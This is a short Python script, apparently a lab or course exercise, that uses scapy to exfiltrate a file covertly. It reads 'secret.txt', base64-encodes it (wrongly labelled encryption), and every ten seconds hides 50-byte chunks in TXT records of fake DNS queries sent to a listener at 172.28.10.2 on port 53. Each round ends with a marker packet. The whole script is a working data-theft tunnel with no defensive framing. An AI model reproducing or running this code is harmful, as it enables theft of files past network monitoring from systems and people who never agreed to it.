import base64
from scapy.all import *
import time

numberOfBytesInAPacket=50

fd = open("secret.txt")

secret = fd.read()

encryptedSecret = base64.encodebytes(secret.encode())
#(Ether(dst="02:42:ac:11:00:02")/IP(dst="172.28.10.2")/UDP(sport=RandShort(), dport=53)
while True:
    time.sleep(10)
    x=0
    for i in range(0,len(encryptedSecret),numberOfBytesInAPacket):
        toSend = encryptedSecret[i:min(i+numberOfBytesInAPacket, len(encryptedSecret))]
        send(IP(dst="172.28.10.2")/UDP(sport=RandShort(), dport=53)/DNS(id=x,qd=DNSQR(qname="doesnotexist.com",qtype="A"),ar=DNSRR(rrname="qkded.ly",type="TXT",rdata=toSend)))
        x+=1

    x=65532
    send(IP(dst="172.28.10.2")/UDP(sport=RandShort(), dport=53)/DNS(id=x,qd=DNSQR(qname="doesnotexist.com",qtype="A")))
   